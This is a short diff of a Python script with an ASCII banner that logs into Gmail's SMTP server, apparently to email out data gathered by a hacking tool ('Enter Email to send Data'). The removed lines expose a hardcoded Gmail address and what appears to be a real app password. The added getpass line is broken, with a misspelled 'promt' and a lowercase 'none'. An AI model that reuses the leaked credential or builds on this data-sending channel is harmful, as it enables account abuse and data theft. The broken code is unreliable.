@@ -17,8 +17,8 @@ __|__/  /_/  _  .___/\___//_/ |_|
                               /____/             /____/  /____/                           
 ''')
 
-email = 'learn2hack4ever@gmail.com'
-password = 'vellnzvxbeugacqw'
+email = input('Enter Email to send Data')
+password = getpass.getpass(promt='Password: ', stream=none)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
